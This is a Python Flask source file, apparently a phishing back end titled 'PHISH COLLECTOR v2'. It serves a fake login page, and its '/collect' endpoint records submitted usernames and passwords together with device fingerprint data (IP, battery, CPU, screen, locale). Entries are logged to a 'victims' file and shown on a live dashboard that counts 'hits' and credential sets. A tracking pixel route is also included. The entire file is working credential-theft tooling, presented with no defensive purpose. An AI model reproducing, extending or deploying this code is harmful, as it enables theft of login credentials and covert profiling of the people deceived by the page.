from flask import Flask, request, jsonify, send_file, render_template_string
import os
import json
from datetime import datetime

app = Flask(__name__)
PORT = 3000

victims = []
id_counter = 1

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title></title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  background: #07070d;
  color: #e2e2e8;
  padding: 0;
  min-height: 100vh;
}

/* HEADER */
.header {
  background: linear-gradient(135deg, #0d0d1a 0%, #1a0a0a 100%);
  border-bottom: 1px solid #1f1f30;
  padding: 20px 28px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  gap: 12px;
  position: sticky;
  top: 0;
  z-index: 100;
  backdrop-filter: blur(20px);
}
.header-left h1 {
  font-size: 22px;
  font-weight: 800;
  color: #ff2d55;
  letter-spacing: -0.5px;
}
.header-left h1 span { color: #fff; font-weight: 400; }
.header-left .subtitle { font-size: 12px; color: #6b6b80; margin-top: 2px; }
.header-right { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }

/* STATS ROW */
.stats-row {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
  gap: 10px;
  padding: 16px 28px;
  background: #0a0a14;
  border-bottom: 1px solid #14141f;
}
.stat-box {
  background: #10101e;
  border: 1px solid #1c1c2e;
  border-radius: 10px;
  padding: 12px 16px;
  text-align: center;
}
.stat-box .num {
  font-size: 26px;
  font-weight: 800;
  color: #fff;
  line-height: 1.2;
}
.stat-box .num.green { color: #34d399; }
.stat-box .num.red { color: #ff2d55; }
.stat-box .num.cyan { color: #22d3ee; }
.stat-box .num.yellow { color: #fbbf24; }
.stat-box .num.purple { color: #a78bfa; }
.stat-box .label { font-size: 11px; color: #6b6b80; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; margin-top: 4px; }

/* PERSON CARDS */
.person-card {
  margin: 16px 28px;
  background: #0c0c1a;
  border: 1px solid #1a1a2e;
  border-radius: 14px;
  overflow: hidden;
  box-shadow: 0 4px 24px rgba(0,0,0,0.4);
}
.person-header {
  background: linear-gradient(90deg, #111122 0%, #1a0a14 100%);
  padding: 16px 20px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
  gap: 10px;
  border-bottom: 1px solid #1a1a2e;
}
.person-info { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
.person-avatar {
  width: 40px; height: 40px;
  background: linear-gradient(135deg, #ff2d55, #ff6b35);
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  font-weight: 800; font-size: 18px; color: #fff;
  flex-shrink: 0;
}
.person-meta .name-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
.person-meta .name-row .person-label { font-weight: 700; font-size: 15px; color: #fff; }
.person-meta .name-row .person-id { font-size: 11px; color: #6b6b80; font-family: 'JetBrains Mono', monospace; }
.person-meta .tags { display: flex; gap: 6px; margin-top: 4px; flex-wrap: wrap; }
.tag {
  display: inline-flex; align-items: center; gap: 4px;
  padding: 3px 10px; border-radius: 6px;
  font-size: 11px; font-weight: 600;
  font-family: 'Inter', sans-serif;
}
.tag-os { background: #0d1b2a; color: #4dabf7; border: 1px solid #1a2d42; }
.tag-browser { background: #1a0d2a; color: #da77f2; border: 1px solid #2a1a42; }
.tag-device { background: #0d2a1a; color: #51cf66; border: 1px solid #1a422a; }
.tag-battery { background: #2a1d0d; color: #fcc419; border: 1px solid #42301a; }
.tag-ip { background: #1a1a2a; color: #9775fa; border: 1px solid #2a2a42; font-family: 'JetBrains Mono', monospace; }
.tag-time { background: #14141f; color: #868e96; border: 1px solid #1f1f2e; font-family: 'JetBrains Mono', monospace; font-size: 10px; }

/* ATTEMPT ROWS */
.attempts-container { padding: 0; }
.attempt-row {
  display: grid;
  grid-template-columns: 52px 1fr;
  border-bottom: 1px solid #14141f;
  transition: background 0.15s;
}
.attempt-row:last-child { border-bottom: 0; }
.attempt-row:hover { background: rgba(255,255,255,0.02); }
.attempt-sidebar {
  display: flex; flex-direction: column; align-items: center;
  justify-content: flex-start; padding: 14px 0;
  background: rgba(255,255,255,0.02);
  border-right: 1px solid #14141f;
}
.attempt-num {
  font-size: 20px; font-weight: 800;
  line-height: 1;
}
.attempt-num.at1 { color: #ff2d55; }
.attempt-num.at2 { color: #fbbf24; }
.attempt-label {
  font-size: 9px; text-transform: uppercase; letter-spacing: 0.5px;
  color: #6b6b80; margin-top: 2px; font-weight: 600;
}
.creds-badge {
  display: inline-block;
  padding: 2px 8px; border-radius: 4px;
  font-size: 9px; font-weight: 700; letter-spacing: 0.3px;
  margin-top: 4px;
}
.creds-badge.yes { background: #2d1a1a; color: #ff6b6b; border: 1px solid #4a1a1a; }
.creds-badge.no { background: #1a1d2d; color: #6b7b9b; border: 1px solid #1a1d3a; }

.attempt-content {
  padding: 12px 16px;
  display: flex; flex-direction: column; gap: 4px;
}
.attempt-time {
  font-size: 11px; color: #6b6b80; font-family: 'JetBrains Mono', monospace;
}
.creds-display {
  background: #1a0505;
  border: 1px solid #3a1010;
  border-radius: 8px;
  padding: 10px 14px;
  margin: 4px 0 2px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  font-weight: 600;
  color: #ff6b6b;
  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
}
.creds-display .cred-label { color: #8a5a5a; font-weight: 400; font-size: 11px; }
.creds-display .cred-sep { color: #4a2020; font-weight: 300; }
.detail-row {
  display: flex; gap: 6px; align-items: center; flex-wrap: wrap;
  font-size: 12px; color: #8888a0; line-height: 1.5;
}
.detail-row .k { color: #5a5a72; min-width: 60px; font-size: 11px; }
.detail-row .v { color: #b0b0c8; }
.detail-row .v.important { color: #e0e0f0; font-weight: 500; }

/* EMPTY STATE */
.empty-state {
  text-align: center; padding: 80px 20px;
  color: #4a4a60; font-size: 16px;
}
.empty-state .big-icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
.empty-state a { color: #ff2d55; text-decoration: none; font-weight: 600; }
.empty-state a:hover { text-decoration: underline; }

/* RESPONSIVE */
@media (max-width: 600px) {
  .header { padding: 14px 16px; }
  .stats-row { padding: 12px 16px; gap: 8px; grid-template-columns: repeat(2, 1fr); }
  .person-card { margin: 12px 12px; }
  .person-header { padding: 12px 14px; }
  .attempt-content { padding: 10px 12px; }
  .attempt-sidebar { padding: 10px 0; }
  .creds-display { font-size: 12px; padding: 8px 10px; flex-direction: column; align-items: flex-start; gap: 4px; }
}

/* FILTER BAR */
.filter-bar {
  display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
}
.filter-btn {
  padding: 6px 14px; border-radius: 8px; border: 1px solid #1f1f30;
  background: transparent; color: #6b6b80; font-size: 12px;
  font-weight: 500; cursor: pointer; transition: all 0.15s;
  font-family: 'Inter', sans-serif;
}
.filter-btn:hover { border-color: #3a3a50; color: #b0b0c8; }
.filter-btn.active { background: #ff2d55; border-color: #ff2d55; color: #fff; }
.filter-btn.cred { border-color: #3a1a1a; color: #ff6b6b; }
.filter-btn.cred.active { background: #ff2d55; border-color: #ff2d55; color: #fff; }

/* AUTO-REFRESH INDICATOR */
.live-indicator {
  display: flex; align-items: center; gap: 6px;
  font-size: 12px; color: #34d399; font-weight: 600;
}
.live-dot {
  width: 8px; height: 8px; border-radius: 50%;
  background: #34d399;
  animation: pulse 1.5s ease-in-out infinite;
}
@keyframes pulse {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.4; transform: scale(0.8); }
}

/* RAW DATA TOGGLE */
.raw-toggle {
  font-size: 11px; color: #4a4a60; cursor: pointer;
  padding: 2px 0; display: inline-block;
}
.raw-toggle:hover { color: #6b6b80; }
.raw-json {
  display: none; background: #050510; border: 1px solid #1a1a2e;
  border-radius: 6px; padding: 10px; font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: #6b6b80; margin-top: 4px; overflow-x: auto;
  white-space: pre-wrap; word-break: break-all;
}
.raw-json.show { display: block; }

/* CLEAR BUTTON */
.clear-btn {
  padding: 6px 14px; border-radius: 8px; border: 1px solid #2a1a1a;
  background: transparent; color: #ff6b6b; font-size: 12px;
  font-weight: 500; cursor: pointer; transition: all 0.15s;
  font-family: 'Inter', sans-serif;
}
.clear-btn:hover { background: #2a0a0a; border-color: #4a1a1a; }
</style>
</head>
<body>
<div class="header">
  <div class="header-left">
    <div class="subtitle">{{ total_hits }} hit{% if total_hits != 1 %}s{% endif %} · {{ total_creds_with }} with creds · {{ total_people }} person{% if total_people != 1 %}s{% endif %}</div>
  </div>
  <div class="header-right">
    {% if victims %}
    <button class="clear-btn" onclick="if(confirm('Clear all victims from this session?')){ fetch('/clear').then(function(){ window.location.reload(); }); }">✕ Clear</button>
    {% endif %}
    <div class="live-indicator"><span class="live-dot"></span> LIVE</div>
  </div>
</div>

<div class="stats-row">
  <div class="stat-box"><div class="num cyan">{{ total_hits }}</div><div class="label">Total Hits</div></div>
  <div class="stat-box"><div class="num red">{{ total_creds_with }}</div><div class="label">With Credentials</div></div>
  <div class="stat-box"><div class="num green">{{ total_people }}</div><div class="label">Unique People</div></div>
  <div class="stat-box"><div class="num purple">{{ total_creds_sets }}</div><div class="label">Credential Sets</div></div>
  <div class="stat-box"><div class="num yellow">{{ total_attempts_all }}</div><div class="label">Total Attempts</div></div>
  <div class="stat-box"><div class="num" style="color:#9775fa;">{{ multi_attempt_people }}</div><div class="label">Multi-Attempt</div></div>
</div>

{% if not victims %}
<div class="empty-state">
  <div class="big-icon">📡</div>
  <p>No hits yet. Open <a href="/">the login page</a> and wait for targets.</p>
</div>
{% else %}
  {% for card in cards %}
    {{ card|safe }}
  {% endfor %}
{% endif %}

<script>
// Auto-refresh every 3 seconds
(function() {
  var refreshInterval = 3000;
  var timer = setTimeout(function refresh(){
    fetch('/dashboard?format=json')
      .then(function(r){ return r.json(); })
      .then(function(data){
        if(data.changed){
          window.location.reload();
        }
        timer = setTimeout(refresh, refreshInterval);
      })
      .catch(function(){
        timer = setTimeout(refresh, refreshInterval);
      });
  }, refreshInterval);
})();

function toggleRaw(id) {
  var el = document.getElementById('raw-' + id);
  if(el) el.classList.toggle('show');
}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return send_file('lal.html')

@app.route('/collect', methods=['POST'])
def collect():
    global id_counter
    
    data = request.get_json(silent=True)
    if data is None:
        data = request.form.to_dict()
    if not data or not isinstance(data, dict):
        data = {}
    
    entry_id = id_counter
    id_counter += 1
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    entry = {
        'id': entry_id,
        'timestamp': data.get('timestamp', datetime.now().isoformat()),
        'ip': ip,
        'userAgent': data.get('userAgent', 'N/A'),
        'browser': data.get('browser', '?'),
        'os': data.get('os', '?'),
        'device': data.get('device', '?'),
        'credentials': data.get('credentials'),
        'battery': data.get('battery'),
        'cpu': data.get('cpu', '?'),
        'memory': data.get('memory', '?'),
        'screen': data.get('screen'),
        'dpr': data.get('dpr', '?'),
        'language': data.get('language', '?'),
        'timezone': data.get('timezone', '?'),
        'attempt': data.get('attempt', 0),
        'raw': json.dumps(data, indent=2)
    }
    
    victims.insert(0, entry)
    
    try:
        with open('victims.log', 'a') as f:
            f.write(json.dumps(entry, indent=2) + ',\n')
    except:
        pass
    
    print(f'\n[+] VICTIM #{entry_id} | IP: {ip}')
    print(f'    Device: {entry["device"]} | OS: {entry["os"]} | Browser: {entry["browser"]}')
    if entry.get('battery'): print(f'    Battery: {entry["battery"].get("level")} | Charging: {entry["battery"].get("charging")}')
    if entry.get('cpu'): print(f'    CPU: {entry["cpu"]} cores | RAM: {entry["memory"]}')
    if entry.get('credentials'): print(f'    ** CREDENTIALS: {entry["credentials"]["username"]} / {entry["credentials"]["password"]} **')
    
    return jsonify({'status': 'ok'})

def esc(s):
    if not isinstance(s, str):
        return str(s) if s is not None else ''
    return s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#039;')

LAST_CHECKSUM = 0

@app.route('/dashboard')
def dashboard():
    global LAST_CHECKSUM
    
    # Group attempts by IP
    groups = {}
    order = []
    for v in victims:
        ip = v.get('ip', 'unknown')
        if ip not in groups:
            groups[ip] = []
            order.append(ip)
        groups[ip].append(v)
    
    total_hits = len(victims)
    total_creds_with = sum(1 for v in victims if v.get('credentials'))
    total_people = len(groups)
    total_creds_sets = sum(1 for v in victims if v.get('credentials'))
    total_attempts_all = len(victims)
    multi_attempt_people = sum(1 for ip, entries in groups.items() if len(entries) > 1)
    
    # JSON endpoint for auto-refresh check
    fmt = request.args.get('format', '')
    if fmt == 'json':
        checksum = total_hits * 1000 + total_creds_sets
        changed = checksum != LAST_CHECKSUM
        LAST_CHECKSUM = checksum
        return jsonify({'changed': changed, 'hits': total_hits, 'creds': total_creds_sets})
    
    if not victims:
        cards = []
    else:
        cards = []
        for ip in order:
            entries = groups[ip]
            first = entries[0] if entries else {}
            
            time_str = first.get('timestamp', '')
            try:
                time_str = datetime.fromisoformat(time_str.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
            except:
                pass
            
            os_tag = esc(first.get('os', '?'))
            browser_tag = esc(first.get('browser', '?'))
            device_tag = esc(first.get('device', '?'))
            ip_tag = esc(ip)
            
            battery_str = ''
            if first.get('battery'):
                bat = first['battery']
                battery_str = f'Battery: {bat.get("level", "?")}'
                battery_tag_val = f'<span class="tag tag-battery">🔋 {esc(bat.get("level", "?"))}</span>'
            else:
                battery_tag_val = ''
            
            # Person initial letter
            initial = chr(65 + min(order.index(ip), 25))  # A-Z
            
            attempts_html = ''
            for i, a in enumerate(entries):
                attempt_num = a.get('attempt', i + 1)
                is_first = (i == 0 and attempt_num <= 1)
                
                creds_box = ''
                has_creds = a.get('credentials') is not None
                if has_creds:
                    creds_box = f'<div class="creds-display"><span class="cred-label">🔑 CREDENTIALS</span> {esc(a["credentials"]["username"])} <span class="cred-sep">/</span> {esc(a["credentials"]["password"])}</div>'
                
                a_time = a.get('timestamp', '')
                try:
                    a_time = datetime.fromisoformat(a_time.replace('Z', '+00:00')).strftime('%H:%M:%S')
                except:
                    pass
                
                a_date = a.get('timestamp', '')
                try:
                    a_date = datetime.fromisoformat(a_date.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
                except:
                    pass
                
                hw = f'CPU: {esc(a.get("cpu", "?"))} cores · RAM: {esc(a.get("memory", "?"))}'
                
                screen_str = 'N/A'
                if a.get('screen'):
                    s = a['screen']
                    screen_str = f'{s.get("w", "?")}x{s.get("h", "?")} @ {esc(a.get("dpr", "?"))}x'
                
                lang_str = f'{esc(a.get("language", "?"))} · {esc(a.get("timezone", "?"))}'
                
                battery_info = 'N/A'
                if a.get('battery'):
                    bat = a['battery']
                    charging_str = '⚡ Charging' if bat.get('charging') else '🔋 Not charging'
                    battery_info = f'{esc(bat.get("level", "?"))} · {charging_str}'
                

                
                cred_badge = '<span class="creds-badge yes">🔑 CREDS</span>' if has_creds else '<span class="creds-badge no">── NONE</span>'
                
                num_class = 'at1' if attempt_num <= 1 else 'at2'
                
                attempts_html += f'''<div class="attempt-row">
<div class="attempt-sidebar">
<div class="attempt-num {num_class}">#{attempt_num}</div>
<div class="attempt-label">Attempt</div>
{cred_badge}
</div>
<div class="attempt-content">
<div class="attempt-time">🕐 {a_date}</div>
{creds_box}
<div class="detail-row"><span class="k">📱 Device</span><span class="v important">{esc(a.get("device", "?"))} · {esc(a.get("os", "?"))} · {esc(a.get("browser", "?"))}</span></div>
<div class="detail-row"><span class="k">🖥️ Screen</span><span class="v">{screen_str}</span></div>
<div class="detail-row"><span class="k">🔧 Hardware</span><span class="v">{hw}</span></div>
<div class="detail-row"><span class="k">🔋 Battery</span><span class="v">{battery_info}</span></div>
<div class="detail-row"><span class="k">🗣️ Locale</span><span class="v">{lang_str}</span></div>
</div>
</div>'''
            
            attempts_reversed = attempts_html  # already newest first
            
            card = f'''<div class="person-card">
<div class="person-header">
<div class="person-info">
<div class="person-avatar">{initial}</div>
<div class="person-meta">
<div class="name-row">
<span class="person-label">Person {initial}</span>
<span class="person-id">#{order.index(ip) + 1}</span>
</div>
<div class="tags">
<span class="tag tag-os">{os_tag}</span>
<span class="tag tag-browser">{browser_tag}</span>
<span class="tag tag-device">{device_tag}</span>
<span class="tag tag-ip">🌐 {ip_tag}</span>
{battery_tag_val}
</div>
</div>
</div>
<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
<span class="tag tag-time">🕐 {time_str}</span>
<span style="font-size:12px;color:#6b6b80;font-weight:500;">{len(entries)} attempt{"s" if len(entries) != 1 else ""}</span>
</div>
</div>
<div class="attempts-container">
{attempts_reversed}
</div>
</div>'''
            
            cards.append(card)
    
    return render_template_string(DASHBOARD_HTML,
        total_hits=total_hits,
        total_creds_with=total_creds_with,
        total_people=total_people,
        total_creds_sets=total_creds_sets,
        total_attempts_all=total_attempts_all,
        multi_attempt_people=multi_attempt_people,
        cards=cards,
        victims=victims
    )

@app.route('/clear', methods=['GET', 'POST'])
def clear():
    global victims, id_counter
    victims = []
    id_counter = 1
    return jsonify({'status': 'cleared'})

@app.route('/pixel')
def pixel():
    pixel_data = bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b')
    from flask import Response
    return Response(pixel_data, mimetype='image/gif')

if __name__ == '__main__':
    print('')
    print('  ╔══════════════════════════════════════╗')
    print('  ║     🕵️  PHISH COLLECTOR v2 (Python)  ║')
    print('  ╠══════════════════════════════════════╣')
    print(f'  ║  Login page:  http://localhost:{PORT}   ║')
    print(f'  ║  Dashboard:   http://localhost:{PORT}/dashboard ║')
    print('  ╚══════════════════════════════════════╝')
    print('')
    app.run()